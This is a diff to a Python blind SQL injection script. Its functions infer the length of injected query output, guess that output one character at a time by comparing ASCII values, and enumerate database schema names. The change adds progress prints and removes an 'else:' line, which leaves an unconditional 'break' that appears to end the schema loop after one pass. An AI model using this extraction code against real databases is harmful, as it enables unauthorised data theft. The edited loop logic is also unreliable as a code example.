@@ -16,6 +16,7 @@ def test_sql_command(payload):
 
 def test_output_length(sql_command, limit=100):
 	for i in range(1,limit+1):
+		print(i,end='\r')
 		if test_sql_command('length({})={}'.format(sql_command,i)):
 			return i
 	return 0
@@ -24,6 +25,7 @@ def test_output_length(sql_command, limit=100):
 def guess_output(sql_command,out_len,char_list):
 	output = ''
 	for i in range(1,out_len+1):
+		print(output, end='\r')
 		for char in char_list:
 			if test_sql_command('ascii(substring({},{},1))={}'.format(sql_command,i,ord(char))):
 				output += char
@@ -36,7 +38,6 @@ def get_schema(table_or_db, command_format,char_list,limit=100):
 		tmp_len = test_output_length(command_format.format(table_or_db,i))
 		if tmp_len > 0:
 			name_len.append(tmp_len)
-		else:
 			break
 	names = []
 	for i in range(len(name_len)):
